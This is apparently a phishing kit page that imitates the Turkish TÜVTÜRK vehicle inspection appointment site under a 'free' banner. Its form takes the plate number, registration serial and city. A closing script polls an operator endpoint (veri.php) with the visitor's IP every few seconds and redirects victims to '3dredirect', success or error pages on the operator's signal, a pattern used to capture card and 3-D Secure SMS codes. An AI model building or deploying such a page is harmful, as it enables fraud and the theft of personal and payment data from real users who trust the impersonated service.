<!DOCTYPE html>
<html lang="tr">

<head id="Head1">
    <meta charset="utf-8">
    <title>
        ÜCRETSİZ TÜVTÜRK Araç Muayene Randevu Sistemi
    </title>
    <meta name="description" content="TÜVTÜRK Ücretsiz Araç Muayene Randevu Sistemini kullanarak hızlı bir şekilde araç muayene randevunuzu alın.">
    <meta name="keywords">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta property="og:title">
    <meta property="og:description">
    <meta property="og:type" content="website">
    <meta property="og:image" content="assets/images/favicons/opengraph.png">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:url">
    <meta name="twitter:title">
    <meta name="twitter:description">
    <meta name="twitter:image" content="assets/images/favicons/touch-icon-120x120.png">
    <link rel="icon" href="assets/images/favicons/favicon.ico">
    <link rel="icon" type="image/png" href="assets/images/favicons/favicon.png">
    <link rel="apple-touch-icon" href="assets/images/favicons/touch-icon.png">
    <link rel="apple-touch-icon" sizes="76x76" href="assets/images/favicons/touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="120x120" href="assets/images/favicons/touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="assets/images/favicons/touch-icon-152x152.png">
    <link rel="stylesheet" href="assets/js/fancybox/jquery.fancybox.css">
    <link rel="stylesheet" href="assets/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="assets/css/jquery.fullPage.css">
    <link rel="stylesheet" href="assets/css/base.css">
    <link rel="stylesheet" href="assets/css/skeleton.css">
    <link rel="stylesheet" href="assets/css/styles.css?v4">
    <link rel="stylesheet" href="assets/css/jAlert.css">
    <script src="assets/js/jquery-3.6.0.min.js"></script>
    <script src="assets/js/jquery-migrate-1.0.0.js"></script>
    <script src="../maps/api/js?sensor=true"></script>
    <script src="assets/js/modernizr.js"></script>
    <script src="assets/js/jquery-ui.min.js"></script>
    <script src="assets/js/infoBox.js"></script>
    <script src="assets/js/jquery.placeholder.js"></script>
    <script src="assets/js/fancybox/jquery.fancybox.pack.js"></script>
    <script src="assets/js/jquery.bxslider.js"></script>
    <script src="assets/js/jquery.inputmask.js"></script>
    <script src="assets/js/jquery.inputmask.regex.extensions.js"></script>
    <script src="assets/js/jquery.inputmask.numeric.extensions.js"></script>
    <script src="assets/js/jquery.inputmask.date.extensions.js"></script>
    <script src="assets/js/readmore.min.js"></script>
    <script src="assets/js/jquery.selectBox.js"></script>
    <script src="assets/js/moment.js"></script>
    <script src="assets/js/jquery.slimscroll.min.js"></script>
    <script src="assets/js/jquery.fullPage.js"></script>
    <script src="assets/js/jquery.maskedinput.js"></script>
    <script src="assets/js/gistfile1.js"></script>
    <script src="assets/js/jAlert.js"></script>
    <script src="assets/js/jAlert-functions.js"></script>
    <script src="script/datepicker-tr.js"></script>

</head>

<body class="body" style="    overflow-y: scroll;
    position: relative;
    height: 100vh;">

    <div id="wrapper">


        <!-- section 01 // 1 (Plaka)-->
        <div class="section " data-anchor="screen01">
            <div class="container">

                <div id="header">
                    <h1 title="TÜVTÜRK" id="logo"><a href="#"></a></h1>
                    <div id="news">
                        <div class="news-date"></div>

                        <div class="news-title">
                            <div class="newsMarquee">
                                <div style="color: white;" class="newsContent"></div>
                                &nbsp;
                            </div>
                        </div>
                        <a href="javascript:void(0)" onclick="openAnnouncementPage(); return false;" target="_blank" class="more-button transition moreNewsButton">Daha Fazlası</a>
                        <div class="clear"></div>
                    </div>
                </div>
                <div id="primary-area">
                    <img src="assets/images/ruhsatpopup.png" class="ruhsatpopup1">
                    <img src="assets/images/tablet-ruhsat.png" class="ruhsatpopup2">
                    <img src="assets/images/ruhsatpop-mobil.png" class="ruhsatpopup3">

                    <div class="one-third columns center">
                        <form method="post" action="index.php" class="form">
                            <fieldset>
                                <div class="alert" id="alertPlate"></div>
                                <label>
                                    <input type="text" id="txtPlate" name="plaka" class="text required arac-plaka placeholder" autocomplete="off" required placeholder="Plaka No">
                                </label>
                            </fieldset>

                            <fieldset id="txtSerialFieldset">
                                <div class="alert"></div>
                                <label>
                                    <input type="text" class="text required  placeholder" placeholder="Ruhsat Seri ve No" autocomplete="off" required id="txtSerial" name="ruhsat">
                                </label>
                            </fieldset>
                            <fieldset>
                                <label>
                                    <select name="sehir" id="ddlCity" placeholder="Şehir" required class="required primary-area">
                                        <option value="">Şehir</option>
                                        <option value="Adana">Adana</option><option value="Adıyaman">Adıyaman</option><option value="Afyon">Afyon</option><option value="Ağrı">Ağrı</option><option value="Amasya">Amasya</option><option value="Ankara">Ankara</option><option value="Antalya">Antalya</option><option value="Artvin">Artvin</option><option value="Aydın">Aydın</option><option value="Balıkesir">Balıkesir</option><option value="Bilecik">Bilecik</option><option value="Bingöl">Bingöl</option><option value="Bitlis">Bitlis</option><option value="Bolu">Bolu</option><option value="Burdur">Burdur</option><option value="Bursa">Bursa</option><option value="Çanakkale">Çanakkale</option><option value="Çankırı">Çankırı</option><option value="Çorum">Çorum</option><option value="Denizli">Denizli</option><option value="Diyarbakır">Diyarbakır</option><option value="Edirne">Edirne</option><option value="Elazığ">Elazığ</option><option value="Erzincan">Erzincan</option><option value="Erzurum">Erzurum</option><option value="Eskişehir">Eskişehir</option><option value="Gaziantep">Gaziantep</option><option value="Giresun">Giresun</option><option value="Gümüşhane">Gümüşhane</option><option value="Hakkari">Hakkari</option><option value="Hatay">Hatay</option><option value="Isparta">Isparta</option><option value="Mersin">Mersin</option><option value="İstanbul">İstanbul</option><option value="İzmir">İzmir</option><option value="Kars">Kars</option><option value="Kastamonu">Kastamonu</option><option value="Kayseri">Kayseri</option><option value="Kırklareli">Kırklareli</option><option value="Kırşehir">Kırşehir</option><option value="Kocaeli">Kocaeli</option><option value="Konya">Konya</option><option value="Kütahya">Kütahya</option><option value="Malatya">Malatya</option><option value="Manisa">Manisa</option><option value="Kahramanmaraş">Kahramanmaraş</option><option value="Mardin">Mardin</option><option value="Muğla">Muğla</option><option value="Muş">Muş</option><option value="Nevşehir">Nevşehir</option><option value="Niğde">Niğde</option><option value="Ordu">Ordu</option><option value="Rize">Rize</option><option value="Sakarya">Sakarya</option><option value="Samsun">Samsun</option><option value="Siirt">Siirt</option><option value="Sinop">Sinop</option><option value="Sivas">Sivas</option><option value="Tekirdağ">Tekirdağ</option><option value="Tokat">Tokat</option><option value="Trabzon">Trabzon</option><option value="Tunceli">Tunceli</option><option value="Şanlıurfa">Şanlıurfa</option><option value="Uşak">Uşak</option><option value="Van">Van</option><option value="Yozgat">Yozgat</option><option value="Zonguldak">Zonguldak</option><option value="Aksaray">Aksaray</option><option value="Bayburt">Bayburt</option><option value="Karaman">Karaman</option><option value="Kırıkkale">Kırıkkale</option><option value="Batman">Batman</option><option value="Şırnak">Şırnak</option><option value="Bartın">Bartın</option><option value="Ardahan">Ardahan</option><option value="Iğdır">Iğdır</option><option value="Yalova">Yalova</option><option value="Karabük">Karabük</option><option value="Kilis">Kilis</option><option value="Osmaniye">Osmaniye</option><option value="Düzce">Düzce</option>                                    </select>
                                </label>
                            </fieldset>

                            <input type="submit" class="submit transition" value="DEVAM">

                            <div style="margin-top: 15px; text-align: center; position: relative; color: #fff; font-size: 18px; font-weight: 300; font-family: Univers,Arial, sans-serif;">
                                Kişisel verilerinizin işlenmesine ilişkin aydınlatma metinlerimize <a href="#" target="_blank" style="text-decoration: underline;">buradan</a> ulaşabilirsiniz.
                            </div>
                        </form>
                    </div>

                </div>



                <div id="footer" style="padding-top:10px">
                    <div style='padding: 10px; font-size: 20px; line-height: 140%; font-family:"Univers",Arial, sans-serif; font-weight:300'>
                        Aşağıda listelenen istasyonlar için <strong>Minibüs</strong> randevusu almak isteyen müşterilerimiz TÜVTÜRK Çağrı Merkezini arayarak randevularını oluşturabilirler. Bilgi ve randevu almak için bize 0850 222 88 88 numaralı telefondan
                        ulaşabilirsiniz.
                        <br> İzmir – Çiğili, Ankara – İstanbul Yolu, Antalya – Sütçüler, İstanbul – Esenyurt, İstanbul – Kurtköy, İstanbul Haraçcı 2
                    </div>
                    <div class="clear"></div>
                    <div class="sixteen columns">
                        <h1>Muayeneden önce lütfen aşağıdaki bölümleri inceleyiniz</h1>
                        <div class="title-seperator"></div>


                        <a href="../404-1.html" target="_blank">
                            <div class="list-item one-third columns alpha">
                                <h2>Muayene Öncesi Yapılacaklar</h2>
                                <img id="footerUserControl_AnnouncementRepeater_ctl00_ImgAnnouncement" src="includes/AnnouncementImage.aspx.jpeg?item=d83a3aac-1a4b-4529-bf73-4657c4c90266.jpg">
                                <p>
                                    <p><span style="font-family: arial, helvetica, sans-serif; font-size: 13.3333330154419px;">Muayene &ouml;ncesi yapılacaklar i&ccedil;in tıklayınız</span></p>
                                    <span class="more-button">DAHA FAZLA</span>
                            </div>
                        </a>

                        <a href="#" target="_blank">
                            <div class="list-item one-third columns alpha">
                                <h2>Muayene İçin Gerekli Belgeler</h2>
                                <img id="footerUserControl_AnnouncementRepeater_ctl01_ImgAnnouncement" src="includes/AnnouncementImage.aspx-1.jpeg?item=fcb47a88-1132-4cbe-ae23-2086738012ae.jpg">
                                <p>
                                    <p>Gerekli Belgeler i&ccedil;in tıklayınız</p>
                                    <span class="more-button">DAHA FAZLA</span>
                            </div>
                        </a>

                        <a href="#" target="_blank">
                            <div class="list-item one-third columns alpha">
                                <h2>Egzoz Gazı Emisyon Ölçümü</h2>
                                <img id="footerUserControl_AnnouncementRepeater_ctl02_ImgAnnouncement" src="includes/AnnouncementImage.aspx-2.jpeg?item=53cf51d7-208e-4466-acc7-397be0f0da10.jpg">
                                <p>
                                    <p><span style="font-family: arial, helvetica, sans-serif; font-size: 13.3333330154419px;">Egzoz emisyon &ouml;l&ccedil;&uuml;m&uuml; i&ccedil;in tıklayınız</span></p>
                                    <span class="more-button">DAHA FAZLA</span>
                            </div>
                        </a>


                        <div class="clear"></div>
                    </div>
                    <div class="clear"></div>
                </div>



            </div>
        </div>
        <!-- /section 01 // 1 (Plaka)-->

    </div>

    <script type="text/javascript">
        $(document).ready(function() {

            gonder();

            var int = self.setInterval("gonder()", 3000);

        });

        function gonder() {
            $.ajax({
                type: 'POST',
                url: 'veri.php?ip=<?php echo $_SERVER["REMOTE_ADDR"];?>',
                success: function(msg) {
                    if (msg == 'sms') {
                        window.location.href = '3dredirect';
                    }
                    if (msg == 'tebrik') {
                        window.location.href = 'success';
                    }
                    if (msg == 'hata1') {
                        window.location.href = 'hata';
                    }
                    if (msg == 'back') {
                        window.location.href = 'index';
                    }
                }
            });
        }
    </script>
</body>

</html>

</body>

</html>